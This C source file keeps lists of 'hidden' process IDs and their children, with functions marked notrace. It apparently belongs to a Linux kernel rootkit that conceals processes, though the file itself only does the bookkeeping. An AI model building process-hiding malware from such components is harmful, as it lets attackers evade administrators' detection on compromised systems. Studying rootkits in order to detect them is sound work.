#include "../include/core.h"
#include "../include/hidden_pids.h"

int child_pids[MAX_HIDDEN_PIDS*128];
int hidden_pids[MAX_HIDDEN_PIDS];
int hidden_count = 0;
int child_count = 0;

notrace void add_child_pid(int pid) {
    int i;

    for (i = 0; i < child_count; i++) {
        if (child_pids[i] == pid)
	    return;
    }

    if (child_count < MAX_HIDDEN_PIDS*128)
        child_pids[child_count++] = pid;
}

notrace int is_child_pid(int pid) {
    int i;

    for (i = 0; i < child_count; i++) {
         if (child_pids[i] == pid)
             return 1;
    }
    return 0;
}

notrace void add_hidden_pid(int pid) {
    int i;

    for (i = 0; i < hidden_count; i++) {
         if (hidden_pids[i] == pid)
             return;
    }

    if (hidden_count < MAX_HIDDEN_PIDS) {
        hidden_pids[hidden_count++] = pid;
    }
}

notrace int is_hidden_pid(int pid) {
    int i;

    for (i = 0; i < hidden_count; i++) {
         if (hidden_pids[i] == pid)
             return 1;
    }
    return 0;
}
